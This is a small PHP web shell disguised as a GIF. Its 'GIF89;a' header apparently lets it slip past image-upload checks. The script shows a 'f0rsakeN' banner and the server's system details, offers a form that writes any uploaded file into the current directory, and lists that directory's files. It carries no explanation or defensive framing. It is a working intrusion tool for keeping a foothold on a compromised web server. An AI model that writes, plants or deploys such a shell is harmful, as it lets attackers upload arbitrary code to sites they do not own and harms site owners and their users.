GIF89;a
<?php
echo '<b>f0rsakeN<br><br>'.php_uname().'<br></b><br>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Yapistir, upload ettik!</b><br><br>'; }
    else { echo '<b>Upload edemedik kanka :(</b><br><br><br><br>'; }
}
$objScan = scandir(".");
foreach ($objScan as $value) {
    echo "folder : $value<br>";
}
?>
